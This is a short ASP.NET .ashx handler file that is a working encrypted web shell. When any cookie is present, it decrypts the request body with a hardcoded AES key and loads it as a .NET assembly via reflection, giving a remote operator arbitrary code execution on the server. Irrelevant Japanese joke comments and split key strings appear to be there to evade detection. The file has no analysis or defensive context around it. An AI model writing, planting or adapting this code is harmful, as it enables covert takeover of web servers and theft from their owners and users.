<%@ WebHandler Language="C#" Class="Z" %>
using System.Web;
public class Z:IHttpHandler{
public void ProcessRequest(HttpContext a){
// このコードは誰が書いたんだ？
int c=a.Request.Cookies.Count;
if(c-1>=0){
// ラーメン食べたい。
string p1="ca634575";string p2="38b9b1e0";
byte[] k=System.Text.Encoding.Default.GetBytes(p1+p2);
byte[] d=new byte[a.Request.ContentLength];
a.Request.InputStream.Read(d,0,d.Length);
// バグじゃない、仕様だ。
var r=new System.Security.Cryptography.RijndaelManaged();
var t=r.CreateDecryptor(k,k).TransformFinalBlock(d,0,d.Length);
var m=System.Type.GetType("System.Reflection.Assembly").GetMethod("Load",new System.Type[]{typeof(byte[])});
object n=m.Invoke(null,new object[]{t});
// 今夜は月が綺麗ですね。
var o=((System.Reflection.Assembly)n).CreateInstance(new string[]{"X","Y","K"}[2]);
o.Equals(a);}}
public bool IsReusable{get{return false;}}}